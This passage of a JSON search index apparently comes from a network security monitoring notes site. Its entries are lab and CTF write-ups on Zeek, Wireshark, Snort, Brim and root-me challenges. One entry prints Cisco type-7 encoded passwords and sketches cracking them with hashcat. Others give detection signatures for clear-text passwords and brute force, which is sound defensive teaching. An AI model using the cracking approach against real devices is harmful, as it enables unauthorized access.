    "c": "ETHERNET patched transmission  root-me challenge ETHERNET - Patched transmission : These frames have been altered upon interception, find the lost information. Password’s format is 10 bytes in hexadecimal notation (i.e. 20 characters) First frame  >>> INGRESS >>> 0x0000: 0050 569e 7bf9 0050 569e 7bfb 8100 0185 0x0010: 86dd 6000 0000 0040 3a40 2002 c000 0203 0x0020: 0000 0000 0000 0000 7331 2002 c000 0203 0x0030: 0000 0000 0000 0000 dead 8000 0af0 0792 0x0040: 0001 146d a451 0000 0000 d020 0300 0000 0x0050: 0000 2d4d 452e 4f52 4720 524f 4f54 2d4d 0x0060: 452e 4f52 4720 524f 4f54 2d4d 452e 4f52 0x0070: 4720 524f 4f54 2d4d 452e Field Value MAC destination (6 octets) 00 50 56 9e 7b f9 MAC source (6 octets) 00 50 56 9e 7b fb 802.1Q TAG (VLAN) (4 octets) 81 00 01 85 Ethertype or length (2 octets) 86 dd (IPv6 frame) Using text2pcap : Second frame  >>> INGRESS >>> 0x0000: 0050 569e 7bf7 0050 569e 7bf9 8100 0186 0x0010: 86dd 6000 0000 0040 3a40 2002 c000 0203 0x0020: 0000 0000 0000 0000 b00b 2002 c000 0203 0x0030: 0000 0000 0000 0000 fada 8000 0af0 0792 0x0040: 0001 146d a451 0000 0000 d020 0300 0000 0x0050: 0000 2d4d 452e 4f52 4720 524f 4f54 2d4d 0x0060: 452e 4f52 4720 524f 4f54 2d4d 452e 4f52 0x0070: 4720 524f 4f54 2d4d 452e Field Value MAC destination (6 octets) 00 50 56 9e 7b f7 MAC source (6 octets) 00 50 56 9e 7b f9 802.1Q TAG (VLAN) (4 octets) 81 00 01 86 Ethertype or length (2 octets) 86 dd (IPv6 frame) Using text2pcap : Third frame  >>> INGRESS >>> 0x0000: 0050 569e 7bfe 0050 569e 7bf7 8100 0186 0x0010: 86dd 6000 0000 0040 3a40 2002 c000 0203 0x0020: 0000 0000 0000 0000 7331 2002 c000 0203 0x0030: 0000 0000 0000 0000 b00b 8000 c760 0795 0x0040: 0001 906d a451 0000 0000 8fac 0b00 0000 0x0050: 0000 2d4d 452e 4f52 4720 524f 4f54 2d4d 0x0060: 452e 4f52 4720 524f 4f54 2d4d 452e 4f52 0x0070: 4720 524f 4f54 2d4d 452e Field Value MAC destination (6 octets) 00 50 56 9e 7b fe MAC source (6 octets) 00 50 56 9e 7b f7 802.1Q TAG (VLAN) (4 octets) 81 00 01 86 Ethertype or length (2 octets) 86 dd (IPv6 frame) Using text2pcap : Fourth frame  <<< EGRESS <<< 0x0000: 0050 569e 7b?? 0050 569e 7b?? ???? 0186 0x0010: 86dd 6000 0000 0040 ??40 2002 c000 0203 0x0020: 0000 0000 0000 0000 ???? 2002 c000 0203 0x0030: 0000 0000 0000 0000 ???? ??00 09f0 0792 0x0040: 0001 146d a451 0000 0000 d020 0300 0000 0x0050: 0000 2d4d 452e 4f52 4720 524f 4f54 2d4d 0x0060: 452e 4f52 4720 524f 4f54 2d4d 452e 4f52 0x0070: 4720 524f 4f54 2d4d 452e Field Value MAC destination (6 octets) 00 50 56 9e 7b ?? MAC source (6 octets) 00 50 56 9e 7b ?? 802.1Q TAG (VLAN) (4 octets) ?? ?? 01 86 Ethertype or length (2 octets) 86 dd (IPv6 frame) First and third frames have incorrect checksums, so this could be a reply to the second (on the same VLAN): Field Value MAC destination (6 octets) 00 50 56 9e 7b f9 MAC source (6 octets) 00 50 56 9e 7b f7 802.1Q TAG (VLAN) (4 octets) 81 00 01 86 Ethertype or length (2 octets) 86 dd (IPv6 frame) Making for: Field Value Missing ICMPv6 Packet 3a 3a IPv6 source 2002 c000 0203 ... fada fada IPv6 destination 2002 c000 0203 ... b00b b00b ICMP-Type 0x81 (echo-reply) 81 0000 00 50 56 9e 7b f9 00 50 56 9e 7b f7 81 00 01 86 0010 86 dd 60 00 00 00 00 40 3a 40 20 02 c0 00 02 03 0020 00 00 00 00 00 00 00 00 fa da 20 02 c0 00 02 03 0030 00 00 00 00 00 00 00 00 b0 0b 81 00 09 f0 07 92 0040 00 01 14 6d a4 51 00 00 00 00 d0 20 03 00 00 00 0050 00 00 2d 4d 45 2e 4f 52 47 20 52 4f 4f 54 2d 4d 0060 45 2e 4f 52 47 20 52 4f 4f 54 2d 4d 45 2e 4f 52 0070 47 20 52 4f 4f 54 2d 4d 45 2e Using text2pcap , and fits! Concatenate the missing info just filled in to get the flag. Resources  Format des trames Ethernet Les réseaux Ethernet - le format des trames",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "e663fa2656b63a580c77687487acdd06",
    "u": "https://nta.tymyrddin.dev/docs/zeek/and",
    "t": "Scripts and signatures ",
    "c": "Scripts and signatures  Zeek scripts can refer to signatures and other Zeek scripts. This flexibility provides a massive advantage in event correlation. Questions  Ensure you are in the right directory to find the pcap file and accompanying files: Desktop/Exercise-Files/TASK-7 Go to folder TASK-7/101 . Investigate the sample.pcap file with the 103.zeek script. Investigate the terminal output. What is the number of the detected new connections? ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-7/101$ zeek -C -r sample.pcap 103.zeek | grep \"New Connection Found\" | wc -l 87 Go to folder TASK-7/201 . Investigate the ftp.pcap file with ftp-admin.sig signature and 201.zeek script. Investigate the signatures.log file. zeek -C -r ftp.pcap -s ftp-admin.sig 201.zeek What is the number of signature hits? ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-7/201$ cat signatures.log | grep \"ftp-admin\" | wc -l 1401 Investigate the signatures.log file. What is the total number of administrator username detections? ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-7/201$ cat signatures.log | grep \"administrator\" | wc -l 731 Investigate the ftp.pcap file with all local scripts, and investigate the loaded_scripts.log file. What is the total number of loaded scripts? zeek -C -r ftp.pcap local ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-7/201$ cat loaded_scripts.log | grep \".zeek\" | wc -l 498 Go to folder TASK-7/202 . Investigate the ftp-brute.pcap file with the /opt/zeek/share/zeek/policy/protocols/ftp/detect-bruteforcing.zeek script. zeek -C -r ftp-brute.pcap /opt/zeek/share/zeek/policy/protocols/ftp/detect-bruteforcing.zeek Investigate the notice.log file. What is the total number of brute-force detections? ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-7/202$ cat notice.log | grep \"Bruteforcing\" | wc -l 2",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "38554a619075f6c97e8fdc6207d4d59a",
    "u": "https://nta.tymyrddin.dev/docs/wireshark/readme",
    "t": "Introduction ",
    "c": "THM Room: Wireshark: Traffic Analysis Introduction  What?  Network sniffing and packet analysis with Wireshark. Why?  Analyse protocols and PCAPs. Packet analysis and finding the needle in the haystack. Traffic analysis and finding anomalies on the network. How?  Nmap scans ARP poisoning & on-path Identifying hosts Tunneling traffic Clear-text protocol analysis Encrypted protocol analysis Hunt clear-text credentials Firewall rules",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "2c935e1cf55ad44a33416bde7bc160ec",
    "u": "https://nta.tymyrddin.dev/docs/zeek/signatures",
    "t": "Signatures ",
    "c": "Signatures  Zeek supports signatures to have rules and event correlations to find noteworthy activities on the network. Zeek signatures use low-level pattern matching and cover conditions similar to Snort rules. Unlike Snort rules, Zeek rules are not the primary event detection point. Zeek has a scripting language and can chain multiple events to find an event of interest. Zeek signatures are composed of three logical paths; signature id, conditions and action. Logical path Breakdown Signature id Unique signature name. Conditions Header : Filtering the packet headers for specific source and destination addresses, protocol and port numbers. Content : Filtering the packet payload for specific value/pattern. Action Default action : Create the signatures.log file in case of a signature match. Additional action : Trigger a Zeek script. The most common conditions and filters for Zeek signatures: Condition Field Available Filters Header src-ip : Source IP. dst-ip : Destination IP. src-port : Source port. dst-port : Destination port. ip-proto : Target protocol. Supported protocols; TCP, UDP, ICMP, ICMP6, IP, IP6 Content payload : Packet payload. http-request : Decoded HTTP requests. http-request-header : Client-side HTTP headers. http-request-body : Client-side HTTP request bodys. http-reply-header : Server-side HTTP headers. http-reply-body : Server-side HTTP request bodys. ftp : Command line input of FTP sessions. Context same-ip : Filtering the source and destination addresses for duplication. Action event : Signature match message. Comparison Operators ==, !=, <, <=, >, >= NOTE! Filters accept string, numeric and regex values. To run Zeek with a signature file: zeek -C -r sample.pcap -s sample.sig -C : Ignore checksum errors. -r : Read pcap file. -s : Use signature file. Questions  Ensure you are in the right directory to find the pcap file and accompanying files: Desktop/Exercise-Files/TASK-5 . HTTP  Investigate the http.pcap file. Create the HTTP signature and investigate the pcap . nano http-password.sig HTTP signature: signature http-password { ip-proto == tcp dst-port == 80 payload /.*password.*/ event \"Clear-text password found.\" } Run zeek : zeek -C -r http.pcap -s http-password.sig What is the source IP of the first event? cat signatures.log | zeek-cut src_addr 10.10.57.178 <= 10.10.57.178 What is the source port of the second event? cat signatures.log | zeek-cut src_port 38706 38712 <= Investigate the conn.log . What is the total number of the sent and received packets from source port 38706 ? cat conn.log | zeek-cut id.orig_p id.resp_h id.resp_p proto service orig_pkts orig_ip_bytes resp_pkts 38704 44.228.249.3 80 tcp - 4 216 2 38706 44.228.249.3 80 tcp http 11 1815 9 <= Total 20 38708 44.228.249.3 80 tcp - 4 216 2 38710 44.228.249.3 80 tcp - 4 216 2 38712 44.228.249.3 80 tcp http 6 1272 5 FTP  Create signature file and investigate the ftp.pcap file. signature ftp-username { ip-proto == tcp ftp /.*USER.*dmin.*/ event \"FTP Username Input Found!\" } signature ftp-brute { ip-proto == tcp payload /.*530.*Login.*incorrect.*/ event \"FTP Brute-force Attempt!\" } Run zeek : zeek -C -r ftp.pcap -s ftp-bruteforce.sig Investigate the notice.log . What is the number of unique events? Top of the file: cat notice.log | head -10 #separator \\x09 #set_separator , #empty_field (empty) #unset_field - #path notice #open 2022-11-28-21-49-01 #fields ts uid id.orig_h id.orig_p id.resp_h id.resp_p fuid file_mime_type file_descproto note msg sub src dst p n peer_descr actions email_dest suppress_for remote_location.country_code remote_location.region remote_location.city remote_location.latitude remote_location.longitude #types time string addr port addr port string string string enum enum string string addr addr port count string set[enum] set[string] interval string string string double double 1024380731.015090 CCKUOW2neqARiqxzI6 10.234.125.254 2217 10.121.70.151 21 - - - tcp Signatures::Sensitive_Signature 10.121.70.151: FTP Brute-force Attempt! 530 Login incorrect.\\x0d\\x0a 10.121.70.151 10.234.125.254 21 - - Notice::ACTION_LOG (empty) 3600.000000 - - - -- 1024380731.043248 C57fWGbeB8QktlHv5 10.234.125.254 2220 10.121.70.151 21 - - - tcp Signatures::Sensitive_Signature 10.121.70.151: FTP Brute-force Attempt! 530 Login incorrect.\\x0d\\x0a 10.121.70.151 10.234.125.254 21 - - Notice::ACTION_LOG (empty) 3600.000000 - - - - And construct command: cat notice.log | zeek-cut uid | sort | uniq | wc -l 1413 What is the number of ftp-brute signature matches? cat signatures.log | grep \"ftp-brute\" | wc -l 1410",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "d129f5cc719887f05df9123add73dfa4",
    "u": "https://nta.tymyrddin.dev/docs/wireshark/encrypted",
    "t": "Encrypted protocol analysis ",
    "c": "Encrypted protocol analysis  Decrypting HTTPS Traffic  When investigating web traffic, analysts often run across encrypted traffic. This is caused by using the Hypertext Transfer Protocol Secure (HTTPS) protocol for enhanced security against spoofing, sniffing and intercepting attacks. HTTPS uses TLS protocol to encrypt communications, so it is impossible to decrypt the traffic and view the transferred data without having the encryption/decryption key pairs. As this protocol provides a good level of security for transmitting sensitive data, attackers and malicious websites also use HTTPS. Knowing how to use key files to decrypt encrypted traffic and investigate the traffic activity, is a must-have skill. The packets will appear in different colours as the HTTP traffic is encrypted. Also, protocol and info details (actual URL address and data returned from the server) will not be fully visible. Questions  Use the Desktop/exercise-pcaps/https/Exercise.pcap file. What is the frame number of the Client Hello message sent to accounts.google.com ? 16 Decrypt the traffic with the KeysLogFile.txt file. What is the number of HTTP2 packets? Edit -> Preferences -> Protocols -> TLS -> Browse for (Pre)-Master-Secret log filename -> KeysLogFile.txt 115 Go to Frame 322 . What is the authority header of the HTTP2 packet? (Enter the address in defanged format.) safebrowsing[.]googleapis[.]com Investigate the decrypted packets and find the flag! What is the flag? File -> Export Objects -> HTTP -> Save txt file to Desktop -> Open file.",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "8c8f916c39d81e097ca9234b1417c0b5",
    "u": "https://nta.tymyrddin.dev/docs/wireshark/creds",
    "t": "Hunt clear-text credentials ",
    "c": "Hunt clear-text credentials  Wireshark is not an IDS, but it provides suggestions for some cases under the expert info. And sometimes anomalies replicate the legitimate traffic, so the detection becomes harder. For example, in a clear-text credential hunting case, it is not easy to spot the multiple credential inputs and decide if there is a brute-force attack or if it is a standard user who mistyped their credentials. As everything is presented at the packet level, it is hard to spot the multiple username/password entries at first glance. The detection time will decrease when an analyst can view the credential entries as a list. Wireshark has such a feature to help analysts who want to hunt clear-text credential entries. Some Wireshark dissectors (FTP, HTTP, IMAP, pop and SMTP) are programmed to extract clear-text passwords from the capture file. View detected credentials using the “Tools -> Credentials” menu. This feature works only after specific versions of Wireshark (v3.1 and later). Since the feature works only with particular protocols, it is suggested to have manual checks and not entirely rely on this feature to decide if there is a clear-text credential in the traffic. Questions  Use the Desktop/exercise-pcaps/bonus/Bonus-exercise.pcap file. What is the packet number of the credentials using HTTP Basic Auth ? 237 What is the packet number where empty password was submitted? 170 .",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "f117c6c2e8ca0d15205603923cfdb746",
    "u": "https://nta.tymyrddin.dev/docs/root-me/cisco-password",
    "t": "CISCO password ",
    "c": "CISCO password  root-me challenge CISCO - password : Find the “Enable” password. (It’s not always a hash.) Tried the enable secret. No go. $ cat ch15.txt | grep \"password 7\" username hub password 7 025017705B3907344E username admin privilege 15 password 7 10181A325528130F010D24 username guest password 7 124F163C42340B112F3830 password 7 144101205C3B29242A3B3C3927 Use the Cisco Password Cracker on those. Pattern emerges. Prepend recursively with pattern in a rule-based hashcat attack . Resources  Cisco passwords Cisco passwords encryption facts",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "268032c092b0c38cdb91119e7988baa9",
    "u": "https://nta.tymyrddin.dev/docs/snort/brute-force",
    "t": "Brute force ",
    "c": "Brute force  THE NARRATOR: J&Y Enterprise is one of the top coffee retails in the world. They are known as tech-coffee shops and serve millions of coffee lover tech geeks and IT specialists every day. They are famous for specific coffee recipes for the IT community and unique names for these products. Their top five recipe names are WannaWhite, ZeroSleep, MacDown, BerryKeep and CryptoY. J&Y’s latest recipe, “Shot4J”, attracted great attention at the global coffee festival. J&Y officials promised that the product will hit the stores in the coming months. The super-secret of this recipe is hidden in a digital safe. Attackers are after this recipe, and J&Y enterprises are having difficulties protecting their digital assets. Last week, they received multiple attacks and decided to work with you to help them improve their security level and protect their recipe secrets. This is your assistant, J.A.V.A. (Just Another Virtual Assistant). She is an AI-driven virtual assistant and will help you notice possible anomalies. Hey, wait, something is happening… J.A.V.A.: Welcome, sir. I am sorry for the interruption. It is an emergency. Somebody is knocking on the door! YOU: Knocking on the door? What do you mean by “knocking on the door”? J.A.V.A.: We have a brute-force attack, sir. THE NARRATOR: This is not a comic book! Would you mind going and checking what’s going on! Please… J.A.V.A.: Sir, you need to observe the traffic with Snort and identify the anomaly first. Then you can create a rule to stop the brute-force attack. GOOD LUCK! Start in sniffer mode and capture some data: sudo snort -dev -l . Investigate with the logfile just created: sudo snort -r snort.log.1669600005 Most packets are sent to port 80 and 22: sudo snort -r snort.log. 'port 80' -n 10 This traffic appears to be normal browsing traffic. sudo snort -r snort.log. 'port 22' -n 10 ... WARNING: No preprocessors configured for policy 0. 11/28-01:46:45.872757 10.10.245.36:46862 -> 10.10.140.29:22 TCP TTL:64 TOS:0x0 ID:64426 IpLen:20 DgmLen:68 DF ***AP*** Seq: 0x8B1F1461 Ack: 0xA4DD5677 Win: 0x1E1 TcpLen: 32 TCP Options (3) => NOP NOP TS: 1884616219 4119723644 =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+ WARNING: No preprocessors configured for policy 0. 11/28-01:46:45.872773 10.10.140.29:22 -> 10.10.245.36:46862 TCP TTL:64 TOS:0x0 ID:29890 IpLen:20 DgmLen:52 DF ***A**** Seq: 0xA4DD5677 Ack: 0x8B1F1471 Win: 0x1E3 TcpLen: 32 TCP Options (3) => NOP NOP TS: 4119723645 1884616219 =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+ This traffic indicates a possible brute-force attack on tcp port 22 (ssh). sudo nano /etc/snort/rules/local.rules Create a rule: # $Id: local.rules,v 1.11 2004/07/23 20:15:44 bmc Exp $ # ---------------- # LOCAL RULES # ---------------- # This file intentionally does not come with signatures. Put your local # additions here. drop tcp any 22 <> any any (msg: \"Brute Force Detected\"; sid: 100001; rev:1;) Start snort in IPS mode: sudo snort -c /etc/snort/snort.conf -q -Q --daq afpacket -i eth0:eth1 -A full And flag!",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "8e62d4a5c8c88f83a72b9d972676ab81",
    "u": "https://nta.tymyrddin.dev/docs/zeek/packages",
    "t": "Packages ",
    "c": "Packages  Zeek Package Manager helps users install third-party scripts and plugins to extend Zeek functionalities with ease. The package manager is installed with Zeek and available with the zkg command. Users can install, load, remove, update and create packages with the zkg tool. Questions  Ensure you are in the right directory to find the pcap file and accompanying files: Desktop/Exercise-Files/TASK-9 Investigate the http.pcap file with the zeek-sniffpass module. zeek -Cr http.pcap /opt/zeek/share/zeek/site/zeek-sniffpass Investigate the notice.log file. Which username has more module hits? ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-9/cleartext-pass$ cat notice.log | zeek-cut msg Password found for user BroZeek Password found for user BroZeek Password found for user BroZeek Password found for user ZeekBro Password found for user ZeekBro Investigate the case2.pcap file with geoip-conn module. zeek -Cr case2.pcap /opt/zeek/share/zeek/site/geoip-conn Investigate the conn.log file . What is the name of the identified City? Which IP address is associated with the identified City? ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-9/geoip-conn$ cat conn.log | zeek-cut geo.resp.city Chicago ... ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-9/geoip-conn$ cat conn.log | zeek-cut geo.resp.city id.resp_h 23.77.86.54 ... Investigate the case2.pcap file with sumstats-counttable.zeek script. How many types of status codes are there in the given traffic capture? ubuntu@ip-10-10-218-60:~/Desktop/Exercise-Files/TASK-9/geoip-conn$ zeek -Cr case2.pcap sumstats-counttable.zeek Host: 23.77.86.54 status code: 301, count: 4 Host: 116.203.71.114 status code: 302, count: 4 status code: 404, count: 6 status code: 301, count: 4 status code: 200, count: 26 Resources  Zeek Package Browser zeek/packages",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "2228fb63696c49d07645f1dda5c69aa2",
    "u": "https://nta.tymyrddin.dev/docs/snort/readme",
    "t": "Introduction ",
    "c": "THM Rooms: Snort-Challenge The Basics and Live Attacks Introduction  What?  Intrusion detection and prevention with Snort. Why?  Detect real-time threats, analyse recorded traffic files and identify anomalies. Write snort rules to analyse live capture network traffic. Defend against a live attack How?  Writing IDS rules MS17-010 Log4j Brute force Reverse shell",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "8d6dccc1f713a2cbb285c5ee9c9a99c8",
    "u": "https://nta.tymyrddin.dev/docs/zeek/monitoring",
    "t": "Network security monitoring ",
    "c": "Network security monitoring  Network monitoring is a set of management actions to watch/continuously overview and optionally save the network traffic for further investigation. This action aims to detect and reduce network problems, improve performance, and in some cases, increase overall productivity. It is a main part of the daily IT/SOC operations and differs from Network Security Monitoring (NSM) in its purpose. Network monitoring  Network monitoring is highly focused on IT assets like uptime (availability), device health and connection quality (performance), and network traffic balance and management (configuration). Monitoring and visualising the network traffic, troubleshooting, and root cause analysis are also part of the Network Monitoring process. This model is helpful for network administrators and usually doesn’t cover identifying non-asset in-depth vulnerabilities and significant security concerns like internal threats and zero-day vulnerabilities. Usually, Network Monitoring is not within the SOC scope. It is linked to the enterprise IT/Network management team. Network security monitoring  Network Security Monitoring is focused on network anomalies like rogue hosts, encrypted traffic, suspicious service and port usage, and malicious/suspicious traffic patterns in an intrusion/anomaly detection and response approach. Monitoring and visualising the network traffic and investigating suspicious events is a core part of Network Security Monitoring. This model is helpful for security analysts/incident responders, security engineers and threat hunters and covers identifying threats, vulnerabilities and security issues with a set of rules, signatures and patterns. Network Security Monitoring is part of the SOC, and the actions are separated between tier 1-2-3 analyst levels.",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "a00d0ad5ed4882d7280bab1945773a4b",
    "u": "https://nta.tymyrddin.dev/docs/root-me/ip-ttl",
    "t": "IP Time To Live ",
    "c": "IP Time To Live  root-me challenge IP - Time To Live : Find the TTL used to reach the targeted host in this ICMP exchange. (Packet capture analysis). Find the first request that has a reply (that one didn’t exceed the TTL). Find TTL in Internet Protocol Version 4 .",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "458e570d504fd11ef1335e3dda0ae992",
    "u": "https://nta.tymyrddin.dev/docs/brim/mining",
    "t": "Crypto mining ",
    "c": "Crypto mining  Cryptocurrencies are frequently on the agenda with their constantly rising value and legal aspect. The ability to obtain cryptocurrencies by mining is becoming one of the biggest problems in today’s corporate environments. Attackers not only compromise the systems and ask for a ransom, but sometimes they also install mining tools (crypto-jacking). Other than the attackers and threat actors, sometimes internal threats and misuse of trust and privileges end up installing coin miners in the corporate environment. Usually, mining cases are slightly different from traditional compromising activities. Internal attacks do not typically contain major malware samples. This does not mean they are not malicious as they are exploiting essential resources like computing power, internet, and electricity. And crypto mining activities require third party applications and tool installations which could be vulnerable or create backdoors. Lastly, mining activities are causing network performance and stability problems. Coin mining is becoming one of the common use cases of threat hunters. Questions  How many connections used port 19999? _path==\"conn\" | 19999 | count() 22 What is the name of the service used by port 6666? _path==\"conn\" | 6666 | cut service irc What is the amount of transferred total bytes to 101.201.172.235:8888 ? _path==\"conn\" | 101.201.172.235 | 8888 3,729 What is the detected MITRE tactic id? event_type==\"alert\" TA0040 Done.",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "2dd81ea476b95d9299d647cfe29ede61",
    "u": "https://nta.tymyrddin.dev/docs/brim/use-cases",
    "t": "Use cases ",
    "c": "Use cases  It is highly suggested to use field names and filtering options and not rely on the blind/irregular search function. Brim provides great indexing of log sources, but it is not performing well in irregular search queries. The best practice is always to use the field filters to search for the event of interest. Filter Communicated Hosts Identifying the list of communicated hosts is the first step of the investigation. Security analysts need to know which hosts are actively communicating on the network to detect any suspicious and abnormal activity in the first place. This approach will help analysts to detect possible access violations, exploitation attempts and malware infections. Query : _path==\"conn\" | cut id.orig_h, id.resp_h | sort | uniq Frequently Communicated Hosts After having the list of communicated hosts, it is important to identify which hosts communicate with each other most frequently. This will help security analysts to detect possible data exfiltration, exploitation and backdooring activities. Query : _path==\"conn\" | cut id.orig_h, id.resp_h | sort | uniq -c | sort -r Most Active Ports Suspicious activities are not always detectable in the first place. Attackers use multiple ways of hiding and bypassing methods to avoid detection. However, since the data is evidence, it is impossible to hide the packet traces. Investigating the most active ports will help analysts to detect silent and well-hidden anomalies by focusing on the data bus and used services. Query : _path==\"conn\" | cut id.resp_p, service | sort | uniq -c | sort -r count Query : _path==\"conn\" | cut id.orig_h, id.resp_h, id.resp_p, service | sort id.resp_p | uniq -c | sort -r Long Connections For security analysts, the long connections could be the first anomaly indicator. If the client is not designed to serve a continuous service, investigating the connection duration between two IP addresses can reveal possible anomalies like backdoors. Query : _path==\"conn\" | cut id.orig_h, id.resp_p, id.resp_h, duration | sort -r duration Transferred Data Another essential point is calculating the transferred data size. If the client is not designed to serve and receive files and act as a file server, it is important to investigate the total bytes for each connection. Thus, analysts can distinguish possible data exfiltration or suspicious file actions like malware downloading and spreading. Query : _path==\"conn\" | put total_bytes := orig_bytes + resp_bytes | sort -r total_bytes | cut uid, id, orig_bytes, resp_bytes, total_bytes DNS and HTTP Queries Identifying suspicious and out of ordinary domain connections and requests is another significant point for a security analyst. Abnormal connections can help detect C2 communications and possible compromised/infected hosts. Identifying the suspicious DNS queries and HTTP requests help security analysts to detect malware C2 channels and support the investigation hypothesis. Query : _path==\"dns\" | count () by query | sort -r Query : _path==\"http\" | count () by uri | sort -r Suspicious Hostnames Identifying suspicious and out of ordinary hostnames helps analysts to detect rogue hosts. Investigating the DHCP logs provides the hostname and domain information. Query : _path==\"dhcp\" | cut host_name, domain Suspicious IP Addresses For security analysts, identifying suspicious and out of ordinary IP addresses is as essential as identifying weird domain addresses. Since the connection logs are stored in one single log file (conn), filtering IP addresses is more manageable and provides more reliable results. Query : _path==\"conn\" | put classnet := network_of(id.resp_h) | cut classnet | count() by classnet | sort -r Detect Files Investigating transferred files is another important point of traffic investigation. Performing this hunt will help security analysts to detect the transfer of malware or infected files by correlating the hash values. This act is also valuable for detecting transferring of sensitive files. Query : filename!=null SMB Activity Another significant point is investigating the SMB activity. This will help analysts to detect possible malicious activities like exploitation, lateral movement and malicious file sharing. When running an investigation, it is suggested to ask, \"What is going on in SMB?\" Query : _path==\"dce_rpc\" OR _path==\"smb_mapping\" OR _path==\"smb_files\" Known Patterns Known patterns represent alerts generated by security solutions. These alerts are generated against the common attack/threat/malware patterns and known by endpoint security products, firewalls and IDS/IPS solutions. This data source highly relies on available signatures, attacks and anomaly patterns. Investigating available log sources containing alerts is vital for a security analyst. Brim supports the Zeek and Suricata logs, so any anomaly detected by these products will create a log file. Investigating these log files can provide a clue where the analyst should focus. Query : event_type==\"alert\" or _path==\"notice\" or _path==\"signatures\"",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "bf3c2c54c61c1d5d92220ea443ec3a64",
    "u": "https://nta.tymyrddin.dev/docs/snort/ms17-010",
    "t": "MS17-010 ",
    "c": "MS17-010  local-1.rules # ---------------- # LOCAL RULES # ---------------- # This file intentionally does not come with signatures. Put your local # additions here. alert tcp any any <> any 445 (msg: \"Exploit Detected!\"; content: \"IPC$\"; sid: 100001; rev:1;) Run snort: ubuntu@ip-10-10-234-43:~/Desktop/Exercise-Files/TASK-7 (MS17-10)$ sudo snort -c local-1.rules -dev -l . -r ms-17-010.pcap ubuntu@ip-10-10-234-43:~/Desktop/Exercise-Files/TASK-7 (MS17-10)$ sudo snort -d -r snort.log.1669590408 Running in packet dump mode --== Initializing Snort ==-- Initializing Output Plugins! pcap DAQ configured to read-file. Acquiring network traffic from \"snort.log.1669590408\". --== Initialization Complete ==-- ,,_ -*> Snort! <*- o\" )~ Version 2.9.7.0 GRE (Build 149) '''' By Martin Roesch & The Snort Team: http://www.snort.org/contact#team Copyright (C) 2014 Cisco and/or its affiliates. All rights reserved. Copyright (C) 1998-2013 Sourcefire, Inc., et al. Using libpcap version 1.9.1 (with TPACKET_V3) Using PCRE version: 8.39 2016-06-14 Using ZLIB version: 1.2.11 Commencing packet processing (pid=3117) WARNING: No preprocessors configured for policy 0. 05/18-08:12:07.219861 192.168.116.149:49368 -> 192.168.116.138:445 TCP TTL:128 TOS:0x0 ID:575 IpLen:20 DgmLen:117 DF ***AP*** Seq: 0xFF7320A3 Ack: 0x223125FA Win: 0xFF TcpLen: 20 00 00 00 49 FF 53 4D 42 75 00 00 00 00 18 01 20 ...I.SMBu...... 00 00 00 00 00 00 00 00 00 00 00 00 00 00 2F 4B ............../K 00 08 C5 5E 04 FF 00 00 00 00 00 01 00 1C 00 00 ...^............ 5C 5C 31 39 32 2E 31 36 38 2E 31 31 36 2E 31 33 \\\\192.168.116.13 38 5C 49 50 43 24 00 3F 3F 3F 3F 3F 00 8\\IPC$.?????. =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "95ef13b73b6026e8683d6cda414cfe50",
    "u": "https://nta.tymyrddin.dev/docs/wireshark/nmap",
    "t": "Nmap scans ",
    "c": "Nmap scans  Nmap is an industry-standard tool for mapping networks, identifying live hosts and discovering the services. As it is one of the most used network scanner tools, a security analyst should identify the network patterns created with it. This section will cover identifying the most common Nmap scan types. TCP connect scans SYN scans UDP scans It is essential to know how Nmap scans work to spot scan activity on the network. Questions  Use the Desktop/exercise-pcaps/nmap/Exercise.pcapng file. What is the total number of the TCP Connect scans? 1000 Which scan type is used to scan the TCP port 80? TCP Connect How many UDP close port messages are there? 1083 Which UDP port in the 55-70 port range is open? 68 .",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "7871fdafe3a7e8dd60c0e9e3af764df0",
    "u": "https://nta.tymyrddin.dev/docs/zeek/log4j",
    "t": "Log4J ",
